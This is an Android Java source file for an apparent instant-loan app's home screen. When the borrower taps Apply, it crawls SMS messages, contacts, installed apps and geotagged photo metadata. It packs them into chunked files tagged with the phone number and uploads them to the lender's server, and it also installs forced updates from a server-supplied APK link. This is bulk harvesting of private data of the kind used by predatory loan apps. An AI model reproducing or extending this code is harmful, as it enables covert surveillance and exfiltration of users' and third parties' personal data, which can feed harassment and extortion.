package com.lirongyuns.happyrupees.fragment;

import androidx.lifecycle.ViewModelProvider;

import android.Manifest;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;

import com.cretin.www.cretinautoupdatelibrary.activity.UpdateType5Activity;
import com.cretin.www.cretinautoupdatelibrary.model.DownloadInfo;
import com.facebook.appevents.AppEventsLogger;
import com.lirongyuns.happyrupees.BuildConfig;
import com.lirongyuns.happyrupees.R;
import com.lirongyuns.happyrupees.activity.BindCardActivity;
import com.lirongyuns.happyrupees.activity.MainActivity;
import com.lirongyuns.happyrupees.activity.OCRActivity;
import com.lirongyuns.happyrupees.activity.PersonalDetailActivity;
import com.lirongyuns.happyrupees.activity.RepaymentListActivity;
import com.lirongyuns.happyrupees.activity.WaitActivity;
import com.lirongyuns.happyrupees.activity.WithdrawActivity;
import com.lirongyuns.happyrupees.bean.UploadAppJson;
import com.lirongyuns.happyrupees.conf.EnviromentConf;
import com.lirongyuns.happyrupees.dialog.LoadingDialog;
import com.lirongyuns.happyrupees.internet.JsonCreator;
import com.lirongyuns.happyrupees.internet.RSA;
import com.lirongyuns.happyrupees.presenter.CrawlPhoneDataPresenterImpl;
import com.lirongyuns.happyrupees.presenter.MainPresenterImpl;
import com.lirongyuns.happyrupees.utils.ConstantUtils;
import com.lirongyuns.happyrupees.utils.FileUtils;
import com.lirongyuns.happyrupees.utils.PermissionUtil;
import com.lirongyuns.happyrupees.utils.PhoneUtils;
import com.lirongyuns.happyrupees.utils.SmsUtils;
import com.lirongyuns.happyrupees.utils.ToastUtil;
import com.lirongyuns.happyrupees.view.CrawlView;
import com.lirongyuns.happyrupees.view.MainView;
import com.xxl.loan.sdk.utils.AppInfoUtils;
import com.xxl.loan.sdk.utils.PhotoUtils;
import com.xxl.loan.sdk.utils.SPUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.Unbinder;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;


public class  MainFragment extends BaseFragment implements MainView, CrawlView {

    private MainViewModel mViewModel;

    private AppEventsLogger logger;
    private String status;
    private JSONArray mPhotoDatas;//相册数据
    private JSONArray mAppDatas;//APP数据
    private JSONArray mSmsDatas;//短信数据
    private JSONArray mContactDatas;//手机联系人数据
    private String mHomeFilePath;

    private MainPresenterImpl mainPresenter;
    private CrawlPhoneDataPresenterImpl crawlPhonePresenter;

    @Override
    protected void initAllChildView(Bundle savedInstanceState) {

    }


    @Override
    protected void initData() {
        mainPresenter = new MainPresenterImpl(this);
        crawlPhonePresenter = new CrawlPhoneDataPresenterImpl(this);
        crawlPhonePresenter.setContext(getContext());
        logger = AppEventsLogger.newLogger(getContext());
        MainActivity activity = (MainActivity) getActivity();
        mainPresenter.uploadUserLoginState(activity.getApp().getMemberId());
        mainPresenter.getAppVersionFromServer(activity.getApp().getMemberId());
    }

    @BindView(R.id.main_apply_btn)
    Button apply;

    private void handlerApplyEvent() {
        LoadingDialog.open(getContext());
        if (TextUtils.isEmpty(ConstantUtils.LOAN_STATUS)) {
            ConstantUtils.LOAN_STATUS = "0";
        }
        switch (ConstantUtils.LOAN_STATUS){
            case "0":
            case "1":
                if("0".equals(ConstantUtils.IS_UPLOAD_ALBUM)){
                    //未上传相册
                    albumCrawl();
                }

                if("0".equals(ConstantUtils.IS_UPLOAD_SMS)){
                    //未上传SMS短信
                    smsCrawl();
                }

                if("0".equals(ConstantUtils.IS_UPLOAD_APP)){
                    //未上传APP信息
                    appCrawl();
                }


                if("0".equals(ConstantUtils.IS_UPLOAD_CONTACT)){
                    //未上传通讯录
                    contactsCrawl();
                }
                break;

        }

        String event_name = null;
        logClick_applyEvent("home apply");
        LoadingDialog.close();
        if(EnviromentConf.isOnlyPage){
            ConstantUtils.LOAN_STATUS = EnviromentConf.Mode_Status;
        }
        if("0".equals(ConstantUtils.LOAN_STATUS)){
            startActivity(new Intent(getContext(), PersonalDetailActivity.class));
            event_name = "DO_PERSONAL";
        } else if("1".equals(ConstantUtils.LOAN_STATUS)){
            //进件流程
            if("0".equalsIgnoreCase(ConstantUtils.IS_UPLOAD_INFORMATION)){
                //填写基本信息
                startActivity(new Intent(getContext(), PersonalDetailActivity.class));
                event_name = "DO_PERSONAL";

            }else if("0".equalsIgnoreCase(ConstantUtils.IS_UPLOAD_PAN)){
                //PAN 卡 OCR
                startActivity(new Intent(getContext(), OCRActivity.class));
                event_name = "DO_OCR";

            }else if("0".equalsIgnoreCase(ConstantUtils.IS_UPLOAD_FACE)){
                //人脸识别
                startActivity(new Intent(getContext(), OCRActivity.class));
                event_name = "DO_FACE";

            }else {
                startActivity(new Intent(getContext(), WaitActivity.class));
                event_name = "TO_AUDIT";
            }
        }else if("2".equals(ConstantUtils.LOAN_STATUS) || "3".equals(ConstantUtils.LOAN_STATUS) ||
                "5".equals(ConstantUtils.LOAN_STATUS) || "7".equals(ConstantUtils.LOAN_STATUS) ||
                "17".equals(ConstantUtils.LOAN_STATUS) ||  "13".equals(ConstantUtils.LOAN_STATUS) ||
                "14".equals(ConstantUtils.LOAN_STATUS) || "21".equals(ConstantUtils.LOAN_STATUS) ||
                "19".equals(ConstantUtils.LOAN_STATUS) || "20".equals(ConstantUtils.LOAN_STATUS)){
            //查看审核状态
            event_name = "VIEW_AUDIT";
            startActivity(new Intent(getContext(), WaitActivity.class));
        }else if( "4".equals(ConstantUtils.LOAN_STATUS) || "6".equals(ConstantUtils.LOAN_STATUS) ){
            //跳转到预览账单页面
            event_name = "VIEW_BILL_DETAILS";
            startActivity(new Intent(getContext(), WithdrawActivity.class));
        }else if("18".equals(ConstantUtils.LOAN_STATUS)){
            //跳转到绑卡页面
            if("1".equals(ConstantUtils.REPEATED_BORROWING) || "4".equals(ConstantUtils.REPEATED_BORROWING)){
                //不验卡
                startActivity(new Intent(getContext(), WaitActivity.class));
                event_name = "DO_AUDIT";
            }else{
                startActivity(new Intent(getContext(), BindCardActivity.class));
                event_name = "DO_BIND_BANK";
            }
        }else if("11".equals(ConstantUtils.LOAN_STATUS) ||"15".equals(ConstantUtils.LOAN_STATUS) ||
                "16".equals(ConstantUtils.LOAN_STATUS) || "8".equals(ConstantUtils.LOAN_STATUS)){
            //跳转到绑卡结果页面
            event_name = "VIEW_BIND_BANK";
            startActivity(new Intent(getContext(), WaitActivity.class));
        }else if("12".equals(ConstantUtils.LOAN_STATUS) || "9".equals(ConstantUtils.LOAN_STATUS)){
            //跳转到还款页面
            event_name = "VIEW_BILL_LIST";
            startActivity(new Intent(getContext(), RepaymentListActivity.class));
        }else if("10".equals(ConstantUtils.LOAN_STATUS) ){
            //还款完成
//            ToastUtil.showLongToast(getContext(), "Thank you for your use and welcome to borrow again");
            if("4".equals(ConstantUtils.REPEATED_BORROWING) || "1".equals(ConstantUtils.REPEATED_BORROWING)){
                //复借
                startActivity(new Intent(getContext(), WaitActivity.class));
                event_name = "DO_REPEAT_LOAN";
            }else if("0".equals(ConstantUtils.REPEATED_BORROWING) || "3".equals(ConstantUtils.REPEATED_BORROWING)){
                //基本信息
                startActivity(new Intent(getContext(), PersonalDetailActivity.class));
                event_name = "DO_REPEAT_LOAN_PERSONAL";
            }else{
                startActivity(new Intent(getContext(), RepaymentListActivity.class));
                event_name = "VIEW_BILL_LIST";
            }
        }else{
            ToastUtil.show(getContext(), "Thanks for using, please try again later");
        }

        MainActivity activity = (MainActivity) getActivity();
        activity.appsflyerEvent(activity.getApp().getPhoneNum(), event_name);
        activity.setFirebaseEvent("", event_name);

        Bundle bundle = new Bundle();
        activity.setFaceBookEvent(bundle, event_name);
    }

    @Override
    protected int getContentViewId() {
        return R.layout.main_fragment;
    }

    private Unbinder mUnbinder;
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View rootView =super.onCreateView(inflater,container,savedInstanceState);
        mUnbinder = ButterKnife.bind(this, rootView);
        apply.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                int id = v.getId();
                switch (id){
                    case R.id.main_apply_btn:
                        handlerApplyEvent();
                        break;
                }
            }
        });
        return rootView;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        mUnbinder.unbind();
    }

    @Override
    public void onActivityCreated(@Nullable Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        mViewModel = new ViewModelProvider(this).get(MainViewModel.class);
        // TODO: Use the ViewModel
    }

    @Override
    public void dismissLoadingDialog() {

    }

    @Override
    public void setHomePageDisplay(String app_setting) {
        if("12".equals(ConstantUtils.LOAN_STATUS)){
            apply.setText("To Repay");
        }else if("4".equals(ConstantUtils.LOAN_STATUS) || "6".equals(ConstantUtils.LOAN_STATUS)){
            apply.setText("To Withdraw");
        }else{
            apply.setText("Apply");
        }
    }

    @Override
    public void setAuditStatusData(String auditStatus) {
        status = auditStatus;
    }

    @Override
    public void setHomeButtonEnable() {
        if(null != apply){
            apply.setEnabled(false);
        }
    }

    @Override
    public void setAppUploadData(UploadAppJson.DataBean data) {
        String link = data.getLink();
        if (TextUtils.isEmpty(link)) {
            return;
        }
        String versionCode = data.getVersion();
        int update = 0;
        String dataUpdate = data.getUpdate();
        if(!TextUtils.isEmpty(dataUpdate)){
            update = Integer.parseInt(dataUpdate);
        }
        if(!BuildConfig.VERSION_NAME.equals(versionCode)){
            //app版本号不等于服务器返回的版本号
            DownloadInfo downloadInfo = new DownloadInfo();
            downloadInfo.setForceUpdateFlag(update);
            downloadInfo.setApkUrl(link);
            downloadInfo.setProdVersionName(data.getVersion());
            UpdateType5Activity.launch(getContext(), downloadInfo);
        }
    }

    @Override
    public void startCrawPhoneData() {

    }

    @Override
    public void showToast(String msg) {
        ToastUtil.show(getContext(), msg);
    }

    public void logClick_applyEvent (String click_apply) {
        Bundle params = new Bundle();
        params.putString("click_apply", click_apply);
        if(params == null){
            ToastUtil.show(activity,"test");
            return;
        }
        logger.logEvent("click_apply", params);
    }

    private void appCrawl(){
        MainActivity activity = (MainActivity) getActivity();
        activity.checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE, isGrant -> {
            if (isGrant) {
                getJsonArrayApps();
            } else {
                showPremissionDialog("Read External Storage Permission denied");
            }
        });
    }

    private void smsCrawl(){
        MainActivity activity = (MainActivity) getActivity();
        activity.checkPermission(Manifest.permission.READ_SMS, isGrant -> {
            if (isGrant) {
                getJsonArraySms();
            } else {
//                showToast("Read SMS Permission denied");
                showPremissionDialog("Read SMS Permission denied");
            }
        });
    }

    private void contactsCrawl(){
        MainActivity activity = (MainActivity) getActivity();
        activity.checkPermission(Manifest.permission.READ_CONTACTS, isGrant -> {
            if (isGrant) {
                getJsonArrayContact();
            } else {
//                showToast("Read Contact Permission denied");
                showPremissionDialog("Read Contact Permission denied");
            }
        });
    }

    private void albumCrawl(){
        MainActivity activity = (MainActivity) getActivity();
        activity.checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE, isGrant -> {
            if (isGrant) {
                getJsonArrayPhotos();
            } else {
//                showToast("Read External Storage Permission denied");
                showPremissionDialog("Read External Storage Permission denied");
            }
        });
    }

    private void getJsonArrayContact() {
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<JSONObject> contacts = PhoneUtils.getContacts(getContext());
                    JSONArray jsonArray = new JSONArray(contacts);
                    mContactDatas = jsonArray;
                    Message message = mHandler.obtainMessage();
                    message.what = 104;
                    mHandler.sendMessage(message);

                } catch (JSONException e) {
                    e.printStackTrace();
                }


            }
        }.start();
    }

    private void getJsonArraySms() {
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<JSONObject> smsMessage = SmsUtils.getPhoneSmsMessage(getContext());
                    JSONArray jsonArray = new JSONArray(smsMessage);
                    mSmsDatas = jsonArray;
                    Message message = mHandler.obtainMessage();
                    message.what = 103;
                    mHandler.sendMessage(message);
                }catch (Exception e){
                    e.printStackTrace();
                }

            }
        }.start();
    }

    private void getJsonArrayApps() {
        ArrayList<JSONObject> datas = new ArrayList<>();
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<AppInfoUtils.AppInfo> appInfos = AppInfoUtils.getInstallPackages(getContext());
                    for (AppInfoUtils.AppInfo info: appInfos) {
                        String app_name = info.getApp_name();
                        String installTime = info.getLastUpdateTime();
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("name", app_name);
                        jsonObject.put("installTime", installTime);
                        datas.add(jsonObject);
                    }
                    JSONArray jsonArray = new JSONArray(datas);
                    mAppDatas =  jsonArray;

                    Message message = mHandler.obtainMessage();
                    message.what = 102;
                    mHandler.sendMessage(message);

                }catch (JSONException e) {
                    e.printStackTrace();
                }


            }
        }.start();
    }

    private void getJsonArrayPhotos() {
        ArrayList<JSONObject> datas = new ArrayList<>();
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<PhotoUtils.PhotoInfo> photoInfos = PhotoUtils.getPhotoInfo(getContext());
                    for (PhotoUtils.PhotoInfo photoInfo : photoInfos) {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("longitude", photoInfo.getLongitude());
                        jsonObject.put("latitude", photoInfo.getLatitude());
                        jsonObject.put("name", photoInfo.getTitle());
                        jsonObject.put("date", photoInfo.getAddDate());
                        jsonObject.put("model", photoInfo.getAuthor());
                        jsonObject.put("height",photoInfo.getHeight());
                        jsonObject.put("width",photoInfo.getWidth());
                        jsonObject.put("author", photoInfo.getAuthor());
                        jsonObject.put("createTime", photoInfo.getModifyDate());
                        datas.add(jsonObject);
                    }
                    JSONArray jsonArray = new JSONArray(datas);
                    mPhotoDatas = jsonArray;
                    Message message = mHandler.obtainMessage();
                    message.what = 101;
                    mHandler.sendMessage(message);

                }catch (JSONException e) {
                    e.printStackTrace();
                }

            }
        }.start();
    }

    private void showPremissionDialog(String message){
        AlertDialog.Builder builder = new AlertDialog.Builder(getContext());
        builder.setTitle("Permissions prompt");
        builder.setMessage(message);
        builder.setPositiveButton("Enter", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                PermissionUtil.gotoPermission(getContext());
            }
        });

        AlertDialog alertDialog = builder.create();
        alertDialog.show();
        alertDialog.setCanceledOnTouchOutside(false);
    }


    private void getSplitSubFile(File sourceFile, String type){
        int blockNum = FileUtils.getSplitFile(sourceFile, 1024 * 100, type, getContext());
    }

    private Handler mHandler = new Handler(Looper.getMainLooper()){
        @Override
        public void handleMessage(Message msg) {
            MainActivity activity = (MainActivity) getActivity();
            switch (msg.what) {
                case 101:
                    //上传相册数据
                    if(null == mPhotoDatas || mPhotoDatas.length()<1){
                        String photoMsg = "No access to album data. Please check if permissions are enabled";
                        showPremissionDialog(photoMsg);
                        return;
                    }
                    String photoFilePath = mHomeFilePath +"/PhotoFile.txt";
                    try {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("dataList", mPhotoDatas);
                        getSourceFile(activity, "photo", photoFilePath, jsonObject.toString());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    break;
                case 104:
                    if (null == mContactDatas || mContactDatas.length()<1) {
                        String contactMsg = "No access to contacts data. Please check if permissions are enabled";
                        showPremissionDialog(contactMsg);
                        return;
                    }


                    String contactFilePath = mHomeFilePath +"/ContactFile.txt";
                    try {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("dataList", mContactDatas);
                        getSourceFile(activity, "contact", contactFilePath, jsonObject.toString());
//                        crawlPhonePresenter.uploadSms(activity.getApp().getMemberId(), mSmsDatas);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
//                    crawlPhonePresenter.uploadContacts(activity.getApp().getMemberId(), mContactDatas);
                    break;
                case 103:
                    if(null == mSmsDatas || mSmsDatas.length()<1){
                        String smsMsg = "No access to Sms data. Please check if permissions are enabled";
                        showPremissionDialog(smsMsg);
                        return;
                    }

                    String smsFilePath = mHomeFilePath +"/SmsFile.txt";
                    try {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("dataList", mSmsDatas);
                        getSourceFile(activity, "sms", smsFilePath, jsonObject.toString());
//                        crawlPhonePresenter.uploadSms(activity.getApp().getMemberId(), mSmsDatas);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    break;
                case 102:
                    if(null == mAppDatas || mAppDatas.length()<1){
                        String appMsg = "No access to apps data. Please check if permissions are enabled";
                        showPremissionDialog(appMsg);
                        return;
                    }

                    String appFilePath = mHomeFilePath +"/AppFile.txt";
                    try {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("dataList", mAppDatas);
                        getSourceFile(activity, "app", appFilePath, jsonObject.toString());
//                        crawlPhonePresenter.uploadSms(activity.getApp().getMemberId(), mSmsDatas);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

//                    crawlPhonePresenter.uploadApp(activity.getApp().getMemberId(), mAppDatas);
                    break;

            }
        }
    };
    private void getSourceFile(MainActivity activity, String type, String sourcePath, String content) {
        File file = new File(sourcePath);
        boolean bSms = FileUtils.writeFile(sourcePath, content);
        ArrayList<File> files = new ArrayList();
        if (bSms) {
            getSplitSubFile(file, type);
            switch (type){

                case "app":
                    files = FileUtils.mAppFiles;
                    break;
                case "contact":
                    files = FileUtils.mContactFiles;
                    break;
                case "sms":
                    files.addAll(FileUtils.mSmsFiles) ;
                    break;
                case "photo":
                    files.addAll(FileUtils.mPhotoFiles);
                    break;
            }
            for (int i = 0; i < files.size() ; i++) {
                boolean aBoolean = SPUtils.getBoolean(getContext(), file.getName(), false);
                if(aBoolean){
                    continue;
                }
                RequestBody requestFile = RequestBody.create(MediaType.parse("multipart/form-data"), files.get(i));
                MultipartBody.Part body = MultipartBody.Part.createFormData("file1", ConstantUtils.PHONE_NUM + "_"+type+"_"+(i+1)+".txt", requestFile);
                JsonCreator jsonCreator = new JsonCreator();
                jsonCreator.put("memberId", activity.getApp().getMemberId());
                jsonCreator.put("fileSize", files.size()+"");
                jsonCreator.put("fileCurrent", (i+1)+"");
                jsonCreator.put("fileName", files.get(i).getName());
                String data = "";
                //分段加密
                try {
                    byte[] bytes = RSA.encryptByPublicKey(jsonCreator.toString().getBytes(), RSA.PUBLICKEY);
                    data = Base64.encodeToString(bytes, Base64.DEFAULT);
                    MultipartBody.Part part = MultipartBody.Part.createFormData("data", data);
                    LoadingDialog.open(getContext());
                    switch (type){
                        case "sms":
                            crawlPhonePresenter.uploadSmsDataFile(body, part,files.get(i));
                            break;
                        case "photo":
                            crawlPhonePresenter.uploadPhotoDataFile(body, part, files.get(i));
                            break;
                        case "app":
                            crawlPhonePresenter.uploadAppDataFile(body, part, files.get(i));
                            break;
                        case "contact":
                            crawlPhonePresenter.uploadContactDataFile(body, part, files.get(i));
                            break;
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        }else{
        }
    }
}